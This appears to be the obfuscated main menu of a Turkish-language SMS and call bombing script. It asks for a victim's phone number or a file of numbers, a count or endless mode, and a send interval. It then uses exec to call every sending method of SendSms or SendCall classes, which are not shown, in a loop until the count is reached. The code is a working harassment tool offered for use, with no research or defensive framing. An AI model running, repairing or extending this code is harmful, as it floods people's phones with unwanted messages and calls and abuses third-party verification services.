@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@YJYYJY?J?J^YJ~7J?7?J?!J~J?7!5G?B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@J55Y?Y!Y?~^7?!7J!7?JYJYYJJJJ5#?G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@YYPY?Y??J7^!7J7??YJ5J!!7!77JY5JG@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y5PY??YGPGY?J?7!~^.::!JY?7~!77?B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@YY5J5GBBPJJ?!^^:...^J5YPBPPY77?P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@JYGGBP5GG?J?7JYJ7:~55PPPBGPG7??5@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y?J77YGP5?7!!?J?JYPGYYYGGGPP?J?5@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5JJJJJ?JJY??7JJ?5?J?JJ?JY5YY5YYY@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y?JY?7777J7777??J7777?7??J?J5JJY@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P55YYYYYYYYYY55555555555PPPPGGGG@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BGGGPPPPPPPPPGGGGGGGGGGGGGGBBBBB&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GGGGPPPPPPPPPGGGGGGGGGGGGGBBBB#G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GGGGPPPPPPPPPGGGGGGGGGGGGGGBB##G&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##BGGPPGGGPPGGGGBBBGBBBBBBB####B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#&&&&####BBGGBB###&@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&####BBBBBBBB#&&&&&@@@&@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    
    Sms: {}                         
    Ara: {}              {}by {}@Vvasillax12\n  
    """.format (Fore .MAGENTA ,len (servisler_sms ),len (servisler_call ),Style .RESET_ALL ,Fore .LIGHTRED_EX ))#line:1166
    try :#line:1167
        menu =(input (Fore .CYAN +" 1- Sms Bombala\n 2- Ara [Bakımda]\n 3- Log\n 4- Bays\n\n"+Fore .LIGHTYELLOW_EX +" Seçim: "))#line:1168
        if menu =="":#line:1169
            continue #line:1170
        menu =int (menu )#line:1171
    except ValueError :#line:1172
        system ("cls||clear")#line:1173
        print (Fore .LIGHTRED_EX +"Hatalı giriş yaptın. Tekrar deneyiniz.")#line:1174
        sleep (3 )#line:1175
        continue #line:1176
    if menu ==1 :#line:1177
        system ("cls||clear")#line:1178
        print (Fore .LIGHTYELLOW_EX +"Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+Fore .LIGHTGREEN_EX ,end ="")#line:1179
        tel_no =input ()#line:1180
        tel_liste =[]#line:1181
        if tel_no =="":#line:1182
            system ("cls||clear")#line:1183
            print (Fore .LIGHTYELLOW_EX +"Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+Fore .LIGHTGREEN_EX ,end ="")#line:1184
            dizin =input ()#line:1185
            try :#line:1186
                with open (dizin ,"r",encoding ="utf-8")as f :#line:1187
                    for i in f .read ().strip ().split ("\n"):#line:1188
                        if len (i )==10 :#line:1189
                            tel_liste .append (i )#line:1190
                sonsuz =""#line:1191
            except FileNotFoundError :#line:1192
                system ("cls||clear")#line:1193
                print (Fore .LIGHTRED_EX +"Hatalı dosya dizini. Tekrar deneyiniz.")#line:1194
                sleep (3 )#line:1195
                continue #line:1196
        else :#line:1197
            try :#line:1198
                int (tel_no )#line:1199
                if len (tel_no )!=10 :#line:1200
                    raise ValueError #line:1201
                tel_liste .append (tel_no )#line:1202
                sonsuz ="(Sonsuz ise 'enter' tuşuna basınız\n Siz uygulamayı kapatana kadar devam edecektir.)"#line:1203
            except ValueError :#line:1204
                system ("cls||clear")#line:1205
                print (Fore .LIGHTRED_EX +"Hatalı telefon numarası. Tekrar deneyiniz.")#line:1206
                sleep (3 )#line:1207
                continue #line:1208
        system ("cls||clear")#line:1209
        try :#line:1210
            print (Fore .LIGHTYELLOW_EX +"Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+Fore .LIGHTGREEN_EX ,end ="")#line:1211
            mail =input ()#line:1212
            if ("@"not in mail or ".com"not in mail )and mail !="":#line:1213
                raise #line:1214
        except :#line:1215
            system ("cls||clear")#line:1216
            print (Fore .LIGHTRED_EX +"Hatalı mail adresi. Tekrar deneyiniz.")#line:1217
            sleep (3 )#line:1218
            continue #line:1219
        system ("cls||clear")#line:1220
        try :#line:1221
            print (Fore .LIGHTYELLOW_EX +f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+Fore .LIGHTGREEN_EX ,end ="")#line:1222
            kere =input ()#line:1223
            if kere :#line:1224
                kere =int (kere )#line:1225
            else :#line:1226
                kere =None #line:1227
        except ValueError :#line:1228
            system ("cls||clear")#line:1229
            print (Fore .LIGHTRED_EX +"Hatalı giriş yaptın. Tekrar deneyiniz.")#line:1230
            sleep (3 )#line:1231
            continue #line:1232
        system ("cls||clear")#line:1233
        try :#line:1234
            print (Fore .LIGHTYELLOW_EX +"Kaç saniye aralıkla göndermek istiyorsun\n 0 en hızlısı :): "+Fore .LIGHTGREEN_EX ,end ="")#line:1235
            aralik =int (input ())#line:1236
        except ValueError :#line:1237
            system ("cls||clear")#line:1238
            print (Fore .LIGHTRED_EX +"Hatalı giriş yaptın. Tekrar deneyiniz.")#line:1239
            sleep (3 )#line:1240
            continue #line:1241
        system ("cls||clear")#line:1242
        if kere is None :#line:1243
            sms =SendSms (tel_no ,mail )#line:1244
            while True :#line:1245
                for attribute in dir (SendSms ):#line:1246
                    attribute_value =getattr (SendSms ,attribute )#line:1247
                    if callable (attribute_value ):#line:1248
                        if attribute .startswith ('__')==False :#line:1249
                            exec ("sms."+attribute +"()")#line:1250
                            sleep (aralik )#line:1251
        for i in tel_liste :#line:1252
            sms =SendSms (i ,mail )#line:1253
            if isinstance (kere ,int ):#line:1254
                    while sms .adet <kere :#line:1255
                        for attribute in dir (SendSms ):#line:1256
                            attribute_value =getattr (SendSms ,attribute )#line:1257
                            if callable (attribute_value ):#line:1258
                                if attribute .startswith ('__')==False :#line:1259
                                    if sms .adet ==kere :#line:1260
                                        break #line:1261
                                    exec ("sms."+attribute +"()")#line:1262
                                    sleep (aralik )#line:1263
        print (Fore .LIGHTRED_EX +"\nMenüye dönmek için 'enter' tuşuna basınız..")#line:1264
        input ()#line:1265
    elif menu ==2 :#line:1266
        system ("cls||clear")#line:1267
        try :#line:1268
            print (Fore .LIGHTYELLOW_EX +"Telefon numarasını başında '+90' olmadan yazınız: "+Fore .LIGHTGREEN_EX ,end ="")#line:1269
            tel_no =int (input ())#line:1270
            if len (str (tel_no ))!=10 :#line:1271
                raise ValueError #line:1272
        except ValueError :#line:1273
            system ("cls||clear")#line:1274
            print (Fore .LIGHTRED_EX +"Hatalı telefon numarası. Tekrar deneyiniz.")#line:1275
            sleep (3 )#line:1276
            continue #line:1277
        system ("cls||clear")#line:1278
        try :#line:1279
            print (Fore .LIGHTYELLOW_EX +"Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+Fore .LIGHTGREEN_EX ,end ="")#line:1280
            mail =input ()#line:1281
            if ("@"not in mail or ".com"not in mail )and mail !="":#line:1282
                raise #line:1283
        except :#line:1284
            system ("cls||clear")#line:1285
            print (Fore .LIGHTRED_EX +"Hatalı mail adresi. Tekrar deneyiniz.")#line:1286
            sleep (3 )#line:1287
            continue #line:1288
        system ("cls||clear")#line:1289
        try :#line:1290
            print (Fore .LIGHTYELLOW_EX +f"Kaç kere aransın (max: {len(servisler_call)}): "+Fore .LIGHTGREEN_EX ,end ="")#line:1291
            kere =int (input ())#line:1292
            if kere >len (servisler_call ):#line:1293
                raise ValueError #line:1294
        except ValueError :#line:1295
            system ("cls||clear")#line:1296
            print (Fore .LIGHTRED_EX +"Hatalı giriş yaptın. Tekrar deneyiniz.")#line:1297
            sleep (3 )#line:1298
            continue #line:1299
        system ("cls||clear")#line:1300
        call =SendCall (tel_no ,mail )#line:1301
        while call .adet <kere :#line:1302
            for attribute in dir (SendCall ):#line:1303
                attribute_value =getattr (SendCall ,attribute )#line:1304
                if callable (attribute_value ):#line:1305
                    if attribute .startswith ('__')==False :#line:1306
                        if call .adet ==kere :#line:1307
                            break #line:1308
                        exec ("call."+attribute +"()")#line:1309
        print (Fore .LIGHTRED_EX +"\nMenüye dönmek için 'enter' tuşuna basınız..")#line:1310
        input ()#line:1311
    elif menu ==3 :#line:1312
        system ("cls||clear")#line:1313
        print (Fore .LIGHTWHITE_EX +" Arayüz güncellendi.\n Takılma sorunları için çözüm aranıyor.\n discord bekleriz")#line:1314
        sleep (12 )#line:1315
    elif menu ==4 :#line:1316
        system ("cls||clear")#line:1317
        print (Fore .LIGHTRED_EX +"Çıkış yapılıyor...")#line:1318
        break #line:1319
